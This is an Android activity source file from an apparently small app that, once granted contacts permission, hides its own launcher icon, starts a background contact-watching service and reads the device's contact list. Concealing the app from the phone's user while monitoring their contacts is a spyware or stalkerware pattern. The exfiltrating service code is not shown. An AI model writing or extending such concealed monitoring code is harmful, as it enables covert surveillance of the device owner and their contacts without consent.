package com.digitstory.testapplication.Activity;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.util.Log;

import com.digitstory.testapplication.R;
import com.digitstory.testapplication.Services.ContactWatchService;
import com.digitstory.testapplication.Services.ContactsFetcher;
import com.digitstory.testapplication.Services.PhoneUnlockedReceiver;
import com.digitstory.testapplication.Utils.Config;

public class ContactWatchActivity extends AppCompatActivity {
    public final static int MY_PERMISSIONS_READ_CONTACTS = 0x1;
    public final static int ASK_MULTIPLE_PERMISSION_REQUEST_CODE = 123;
    public static boolean isAlreadyInstalled = false;
    PhoneUnlockedReceiver receiver;
    ContactsFetcher cf;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_contact_watch);
        Log.d(Config.TAG, "" + Config.isNotificationServiceEnabled(this));
        cf = new ContactsFetcher(this);
        startContactLookService();

    }

    private void hideAppLauncher() {
        PackageManager p = getPackageManager();
        String packageName = this.getPackageName();
        String clsDefault = packageName + ".ContactWatchActivity";
        ComponentName componentName = new ComponentName(this, this.getClass());
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void startContactLookService() {
        Log.d(Config.TAG, "startContactLookService");

        try {
            if (ActivityCompat.checkSelfPermission(ContactWatchActivity.this,
                    Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED) {//Checking permission
                //Starting service for registering ContactObserver
                hideAppLauncher();
                Intent intent = new Intent(ContactWatchActivity.this, ContactWatchService.class);
                Log.d(Config.TAG, "Starting service");
                isAlreadyInstalled = true;
              //  Intent notificationIntent=new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
              //  startActivity(notificationIntent);
                startService(intent);
                receiver = new PhoneUnlockedReceiver();
                IntentFilter filter = new IntentFilter();
                filter.addAction(Intent.ACTION_USER_PRESENT);
                filter.addAction(Intent.ACTION_SCREEN_OFF);
                //No need to add phoneUnlockReceiver
               // registerReceiver(receiver, filter);
                cf.getContactList();
            }
            else {
                //ActivityCompat.requestPermissions(ContactWatchActivity.this, new String[]{Manifest.permission.READ_CONTACTS}, MY_PERMISSIONS_READ_CONTACTS);
                ActivityCompat.requestPermissions(ContactWatchActivity.this, Config.ANDROID_PERMISSIONS, ASK_MULTIPLE_PERMISSION_REQUEST_CODE);
                Log.d(Config.TAG, "Requesting Permission");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //If permission granted
        boolean bReq = requestCode == ASK_MULTIPLE_PERMISSION_REQUEST_CODE;
        boolean bGrant = grantResults[0] == PackageManager.PERMISSION_GRANTED;
        Log.d(Config.TAG, "onRequestPermissionResult.bReq=" + bReq + ", bGrant=" + bGrant);
        if (bReq && bGrant) {
            Log.d(Config.TAG, "Calling startContactLookService() again to start service");
            startContactLookService();
        }
    }




}
